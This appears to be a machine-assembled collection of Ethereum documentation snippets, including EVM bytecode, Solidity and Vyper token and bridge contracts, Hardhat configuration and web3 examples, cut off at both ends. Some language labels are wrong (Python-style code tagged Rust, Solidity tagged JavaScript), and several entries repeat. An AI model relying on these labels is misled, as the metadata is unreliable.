DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 P\n```\n\n----------------------------------------\n\nTITLE: Implementing Input Error Handling for NFT Minting Function\nDESCRIPTION: Basic error handling implementation for the mintNFT function that checks if any required fields (URL, name, description) are empty before proceeding with the minting process.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const mintNFT = async (url, name, description) => {\n  //error handling\n  if (url.trim() == \"\" || name.trim() == \"\" || description.trim() == \"\") {\n    return {\n      success: false,\n      status: \"❗Please make sure all fields are completed before minting.\",\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SPDX License Identifier Declaration for Optimism Contracts\nDESCRIPTION: Specifies the MIT license for Optimism code. Most of Optimism's codebase is released under the MIT license.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\n```\n\n----------------------------------------\n\nTITLE: Translation Chart Image Component in Markdown\nDESCRIPTION: A component that displays a chart showing translation progress across different languages for ethereum.org. This visual representation helps to illustrate the program's reach and impact.\n\nLANGUAGE: markdown\nCODE:\n```\n<TranslationChartImage />\n```\n\n----------------------------------------\n\nTITLE: Removing ETH Liquidity with Permit for Fee-on-Transfer Tokens in Uniswap V2\nDESCRIPTION: This function combines the permit mechanism for meta-transactions with support for fee-on-transfer tokens. It allows users without ETH to withdraw from pools containing tokens with transfer or storage fees.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountETH) {\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n        token, liquidity, amountTokenMin, amountETHMin, to, deadline\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Deployed Bytecode Object\nDESCRIPTION: First portion of the deployed bytecode object for the ERC20 token contract. This represents the actual code deployed to the Ethereum blockchain that implements the token's functionality including transfers, approvals, and balance management.\n\nLANGUAGE: ethereum-bytecode\nCODE:\n```\n\"object\": \"608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260\"\n```\n\n----------------------------------------\n\nTITLE: Interagindo com a DEX usando Python e Brownie\nDESCRIPTION: Exemplo de como interagir com o contrato DEX usando Python em uma sessão interativa do Brownie para comprar tokens, obter o endereço do token implantado e aprovar o contrato DEX como spender.\n\nLANGUAGE: python\nCODE:\n```\n#### Python in interactive brownie console...\n\n# deploy the DEX\ndex = DEX.deploy({'from':account1})\n\n# call the buy function to swap ether for token\n# 1e18 is 1 ether denominated in wei\ndex.buy({'from': account2, 1e18})\n\n# get the deployment address for the ERC20 token\n# that was deployed during DEX contract creation\n# dex.token() returns the deployed address for token\ntoken = ERC20Basic.at(dex.token())\n\n# call the token's approve function\n# approve the dex address as spender\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Approval in Ethereum Virtual Machine\nDESCRIPTION: Sets the approval amount for a spender address. Validates both addresses, updates the allowance mapping, and emits the Approval event. Includes safety checks to prevent approval to zero addresses.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nPUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Displaying Contract ABI in Console\nDESCRIPTION: Logs the contract ABI to the console for inspection. This can be helpful for understanding the interface of the smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(JSON.stringify(contract.abi))\n```\n\n----------------------------------------\n\nTITLE: Reading First Byte of Parameter from Calldata\nDESCRIPTION: Implementation for reading the first byte of a parameter which determines how to process the rest of the parameter data.\n\nLANGUAGE: solidity\nCODE:\n```\n        // The first byte tells us how to interpret the rest\n        uint8 _firstByte;\n\n        _firstByte = uint8(_calldataVal(_fromByte, 1));\n```\n\n----------------------------------------\n\nTITLE: Execution Layer Client Data Directories\nDESCRIPTION: File paths for the blockchain data storage directories used by different execution layer clients (Geth, Parity, Besu, Nethermind).\n\nLANGUAGE: bash\nCODE:\n```\n/home/ethereum/.geth\n/home/ethereum/.parity\n/home/ethereum/.besu\n/home/ethereum/.nethermind\n```\n\n----------------------------------------\n\nTITLE: Deposit Event in ERC-4626 Vault\nDESCRIPTION: The Deposit event must be emitted when tokens are deposited into the vault via the mint and deposit methods, providing information about the transaction participants and amounts.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Deposit(\n    address indexed sender,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Importing Required Dependencies for Viem Client in TypeScript\nDESCRIPTION: Imports necessary functions, type definitions, and chain information from the viem library to interact with the Ethereum blockchain.\n\nLANGUAGE: typescript\nCODE:\n```\nimport {\n  Address,\n  TransactionReceipt,\n  createPublicClient,\n  http,\n  parseAbiItem,\n} from \"viem\"\nimport { mainnet } from \"viem/chains\"\n```\n\n----------------------------------------\n\nTITLE: Implementing transferFrom Function in ERC-20\nDESCRIPTION: Defines the transferFrom function which allows spenders to transfer tokens on behalf of an owner, according to allowances. This enables complex contract interactions where tokens can be spent by authorized third parties.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. O valor é então deduzido do rendimento do chamador.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Etherscan Verification\nDESCRIPTION: Hardhat configuration file setup that includes network settings and Etherscan API configuration for smart contract verification.\n\nLANGUAGE: javascript\nCODE:\n```\n// hardhat.config.js\n\nrequire(\"dotenv\").config()\nrequire(\"@nomiclabs/hardhat-ethers\")\nrequire(\"@nomiclabs/hardhat-etherscan\")\n\nconst { API_URL, PRIVATE_KEY, ETHERSCAN_API_KEY } = process.env\n\nmodule.exports = {\n  solidity: \"0.7.3\",\n  defaultNetwork: \"goerli\",\n  networks: {\n    hardhat: {},\n    goerli: {\n      url: API_URL,\n      accounts: [`0x${PRIVATE_KEY}`],\n    },\n  },\n  etherscan: {\n    // Your API key for Etherscan\n    // Obtain one at https://etherscan.io/\n    apiKey: ETHERSCAN_API_KEY,\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Running JavaScript Interaction Script with Hardhat\nDESCRIPTION: Command to execute the interaction script using Hardhat, which will connect to the blockchain and interact with the deployed contract.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/interact.js\n```\n\n----------------------------------------\n\nTITLE: Using useEffect Hook to Initialize Wallet Connection and Listener\nDESCRIPTION: React useEffect hook implementation that initializes the wallet connection and sets up the wallet listener when the component mounts.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Withdrawal Message Construction in Solidity\nDESCRIPTION: Code that constructs the appropriate message to send to L1 based on whether the token is ETH or an ERC20. This distinguishes between the two token types which need different handling on L1.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Construct calldata for l1TokenBridge.finalizeERC20Withdrawal(_to, _amount)\n        // slither-disable-next-line reentrancy-events\n        address l1Token = IL2StandardERC20(_l2Token).l1Token();\n        bytes memory message;\n\n        if (_l2Token == Lib_PredeployAddresses.OVM_ETH) {\n            message = abi.encodeWithSelector(\n                IL1StandardBridge.finalizeETHWithdrawal.selector,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        } else {\n            message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                l1Token,\n                _l2Token,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        }\n\n        // Send message up to L1 bridge\n        // slither-disable-next-line reentrancy-events\n        sendCrossDomainMessage(l1TokenBridge, _l1Gas, message);\n\n        // slither-disable-next-line reentrancy-events\n        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Finalizing ETH Withdrawals in Ethereum L1-L2 Bridge\nDESCRIPTION: This function processes ETH withdrawals from L2 to L1. It's called by the cross-domain messenger and verifies the caller is the L2 token bridge before transferring ETH to the intended recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function finalizeETHWithdrawal(\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external onlyFromCrossDomainAccount(l2TokenBridge) {\n        // slither-disable-next-line reentrancy-events\n        (bool success, ) = _to.call{ value: _amount }(new bytes(0));\n        require(success, \"TransferHelper::safeTransferETH: ETH transfer failed\");\n\n        // slither-disable-next-line reentrancy-events\n        emit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Getting User's Share Balance in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the total amount of vault shares that the owner currently holds.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Advanced ERC-223 Recipient with Function Execution in Solidity\nDESCRIPTION: An ERC-223 recipient contract that can execute additional functions based on the data parameter in token transfers. This allows for function calls to be encoded in token transfers, similar to Ether transactions.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract RecipientContract is IERC223Recipient {\n    event Foo();\n    event Bar(uint256 someNumber);\n    address tokenA; // The only token that we want to accept.\n    function tokenReceived(address _from, uint _value, bytes memory _data) public override\n    {\n        require(msg.sender == tokenA);\n        address(this).call(_data); // Handle incoming transaction and perform a subsequent function call.\n    }\n    function foo() public\n    {\n        emit Foo();\n    }\n    function bar(uint256 _someNumber) public\n    {\n        emit Bar(_someNumber);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Library Functions in Uniswap V2 Router\nDESCRIPTION: Proxy functions that expose UniswapV2Library functions through the router interface. These include functions for getting quotes, calculating swap amounts, and determining amounts for paths of multiple token swaps.\n\nLANGUAGE: solidity\nCODE:\n```\n// **** LIBRARY FUNCTIONS ****\nfunction quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {\n    return UniswapV2Library.quote(amountA, reserveA, reserveB);\n}\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountOut)\n{\n    return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n}\n\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountIn)\n{\n    return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n}\n\nfunction getAmountsOut(uint amountIn, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n}\n\nfunction getAmountsIn(uint amountOut, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n}\n```\n\n----------------------------------------\n\nTITLE: Comparing ERC-20 BalanceOf with ERC-1155 Batch Balance Function\nDESCRIPTION: Shows the difference between the ERC-20 balanceOf function and the ERC-1155 balanceOfBatch function. The ERC-1155 version allows for querying multiple token balances across multiple addresses in a single call.\n\nLANGUAGE: solidity\nCODE:\n```\n// ERC-20\nfunction balanceOf(address owner) external view returns (uint256);\n\n// ERC-1155\nfunction balanceOfBatch(\n    address[] calldata _owners,\n    uint256[] calldata _ids\n) external view returns (uint256[] memory);\n```\n\n----------------------------------------\n\nTITLE: Defining a Multiply7 Smart Contract in Solidity\nDESCRIPTION: A simple Solidity contract that multiplies an input by 7, emits an event with the result, and returns the calculated value.\n\nLANGUAGE: javascript\nCODE:\n```\ncontract Multiply7 {\n    event Print(uint);\n    function multiply(uint input) returns (uint) {\n        Print(input * 7);\n        return input * 7;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 for Ethereum Blockchain Interaction\nDESCRIPTION: Command to install the Alchemy Web3 package which provides enhanced Web3.js functionality for interacting with the Ethereum blockchain.\n\nLANGUAGE: text\nCODE:\n```\ncd ..\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Masking Address Bits in EVM for Smart Contract Delegate Call\nDESCRIPTION: This code masks the value from Storage[3] with a 160-bit mask to ensure it's a valid Ethereum address before making a delegate call. This is a common pattern in proxy contracts to ensure address integrity.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n85 | PUSH20 0xffffffffffffffffffffffffffffffffffffffff | 0xff....ff Storage[3] 0x9D 0x00\n9A | AND                                               | Storage[3]-as-address 0x9D 0x00\n9B | SWAP1                                              | 0x9D Storage[3]-as-address 0x00\n9C | JUMP                                               | Storage[3]-as-address 0x00\n```\n\n----------------------------------------\n\nTITLE: Smart Contract with Gas-Dependent Operations\nDESCRIPTION: Example Solidity contract with array operations that have different gas costs. It includes functions to push and pop addresses, clear the array, and check for duplicates, along with an Echidna test function.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing the Calldata Interpreter with JavaScript and Ethers.js\nDESCRIPTION: A JavaScript test using ethers.js and chai that demonstrates how to deploy and interact with the Calldata Interpreter contract. The test showcases how to construct and send transactions with optimized calldata.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { expect } = require(\"chai\");\n\ndescribe(\"CalldataInterpreter\", function () {\n  it(\"Should let us use tokens\", async function () {\n    const Token = await ethers.getContractFactory(\"OrisUselessToken\")\n    const token = await Token.deploy()\n    await token.deployed()\n    console.log(\"Token addr:\", token.address)\n\n    const Cdi = await ethers.getContractFactory(\"CalldataInterpreter\")\n    const cdi = await Cdi.deploy(token.address)\n    await cdi.deployed()\n    console.log(\"CalldataInterpreter addr:\", cdi.address)\n\n    const signer = await ethers.getSigner()\n```\n\n----------------------------------------\n\nTITLE: Validating Addresses in ERC-20 Token Transfers\nDESCRIPTION: These requirements ensure that tokens can't be transferred to or from the zero address, which is a common security practice in ERC-20 implementations as the zero address is typically associated with burning or unrecoverable tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(sender != address(0), \"ERC20: transfer from the zero address\");\nrequire(recipient != address(0), \"ERC20: transfer to the zero address\");\n```\n\n----------------------------------------\n\nTITLE: Zero-Knowledge Initialization\nDESCRIPTION: The server initializes the zero-knowledge components after retrieving the configuration data, setting up the minefield dimensions as constants.\n\nLANGUAGE: TypeScript\nCODE:\n```\n// From app.ts lines 34-35\n// Initializes the zero-knowledge part of the server\n```\n\n----------------------------------------\n\nTITLE: Defining Beacon Block Body Structure in Rust for Ethereum\nDESCRIPTION: This code snippet shows the structure of a BeaconBlockBody in Ethereum's consensus layer. It defines all the components that make up a beacon block, including RANDAO reveals, ETH1 data, attestations, slashings, deposits, voluntary exits, sync aggregates, and the execution payload that contains transaction data.\n\nLANGUAGE: rust\nCODE:\n```\nclass BeaconBlockBody(Container):\n    randao_reveal: BLSSignature\n    eth1_data: Eth1Data\n    graffiti: Bytes32\n    proposer_slashings: List[ProposerSlashing, MAX_PROPOSER_SLASHINGS]\n    attester_slashings: List[AttesterSlashing, MAX_ATTESTER_SLASHINGS]\n    attestations: List[Attestation, MAX_ATTESTATIONS]\n    deposits: List[Deposit, MAX_DEPOSITS]\n    voluntary_exits: List[SignedVoluntaryExit, MAX_VOLUNTARY_EXITS]\n    sync_aggregate: SyncAggregate\n    execution_payload: ExecutionPayload\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Etherscan Verification\nDESCRIPTION: Hardhat configuration file setup that includes network settings and Etherscan API configuration for smart contract verification.\n\nLANGUAGE: javascript\nCODE:\n```\n// hardhat.config.js\n\nrequire(\"dotenv\").config()\nrequire(\"@nomiclabs/hardhat-ethers\")\nrequire(\"@nomiclabs/hardhat-etherscan\")\n\nconst { API_URL, PRIVATE_KEY, ETHERSCAN_API_KEY } = process.env\n\nmodule.exports = {\n  solidity: \"0.7.3\",\n  defaultNetwork: \"goerli\",\n  networks: {\n    hardhat: {},\n    goerli: {\n      url: API_URL,\n      accounts: [`0x${PRIVATE_KEY}`],\n    },\n  },\n  etherscan: {\n    // Your API key for Etherscan\n    // Obtain one at https://etherscan.io/\n    apiKey: ETHERSCAN_API_KEY,\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Getting User's Share Balance in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the total amount of vault shares that the owner currently holds.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Instanciation du contrat NFT avec Web3\nDESCRIPTION: Code pour créer une instance du contrat NFT en utilisant Web3.js, en spécifiant l'adresse du contrat et son ABI pour interagir avec lui.\n\nLANGUAGE: javascript\nCODE:\n```\nconst contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\"\n\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC-20 Token Contract\nDESCRIPTION: Low-level EVM bytecode implementing core ERC-20 token functionality. This includes operations for transferring tokens, managing allowances, checking balances, and delegated transfers. The bytecode includes JUMP and JUMPDEST instructions for control flow, and memory management operations.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum App with Template Integration\nDESCRIPTION: Command to create an Ethereum application with a specific template integration. This example shows how to create an app with the Aave template, which includes Aave smart contract addresses and subgraph integration.\n\nLANGUAGE: bash\nCODE:\n```\nyarn create eth-app my-eth-app --with-template aave\n```\n\n----------------------------------------\n\nTITLE: Defining a Multiply7 Smart Contract in Solidity\nDESCRIPTION: A simple Solidity contract that multiplies an input by 7, emits an event with the result, and returns the calculated value.\n\nLANGUAGE: javascript\nCODE:\n```\ncontract Multiply7 {\n    event Print(uint);\n    function multiply(uint input) returns (uint) {\n        Print(input * 7);\n        return input * 7;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Mint Function Implementation with Security Checks\nDESCRIPTION: Implementation details of the mint function including documentation and security checks. It verifies the caller is the minter, prevents minting to the zero address, and adds the token to the recipient.\n\nLANGUAGE: python\nCODE:\n```\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n```\n\n----------------------------------------\n\nTITLE: Importing ERC20 Interface from OpenZeppelin\nDESCRIPTION: Imports the standard ERC20 interface from OpenZeppelin to interact with ERC20 tokens. This enables the bridge to transfer tokens between addresses and layers.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Implementing Calldata Value Size and Boundary Validation\nDESCRIPTION: Safety checks to ensure that calldata value extraction stays within valid bounds and respects size limitations.\n\nLANGUAGE: solidity\nCODE:\n```\n    {\n        uint _retVal;\n\n        require(length < 0x21,\n            \"_calldataVal length limit is 32 bytes\");\n        require(length + startByte <= msg.data.length,\n            \"_calldataVal trying to read beyond calldatasize\");\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ethereum Network ID with net_version\nDESCRIPTION: This method returns the current Ethereum network ID as a string. Common network IDs include 1 (Ethereum Mainnet), 5 (Goerli testnet), and 11155111 (Sepolia testnet).\n\nLANGUAGE: js\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"net_version\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"3\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SPDX License for Optimism Bridge Contracts\nDESCRIPTION: Specifies the MIT license for the Optimism bridge contracts. Most of Optimism's code is released under this open-source license.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\n```\n\n----------------------------------------\n\nTITLE: Adding Value-to-Key Mapping in Cache Write Function\nDESCRIPTION: Code that creates the reverse lookup mapping from a value to its assigned key in the cache system.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Write the value using the next key\n        val2key[_value] = key2val.length+1;\n```\n\n----------------------------------------\n\nTITLE: Gas Estimation with Limited Sequence Length\nDESCRIPTION: YAML configuration that enables gas estimation while limiting the transaction sequence length for easier analysis.\n\nLANGUAGE: yaml\nCODE:\n```\nseqLen: 2\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Approving Specific Token Transfer in Vyper\nDESCRIPTION: External function that allows a token owner to approve another address to transfer a specific token. It verifies the caller is the owner or an authorized operator, and prevents approvals to the current owner.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef approve(_approved: address, _tokenId: uint256):\n    \"\"\"\n    @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n         Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n         Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n         Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    @param _approved Address to be approved for the given NFT ID.\n    @param _tokenId ID of the token to be approved.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    # Throws if `_approved` is the current owner\n    assert _approved != owner\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n    # Set the approval\n    self.idToApprovals[_tokenId] = _approved\n    log Approval(owner, _approved, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Loading Storage Value and Call Value in EVM Bytecode\nDESCRIPTION: This code loads the value from Storage[6] when there's no calldata, which appears to track the 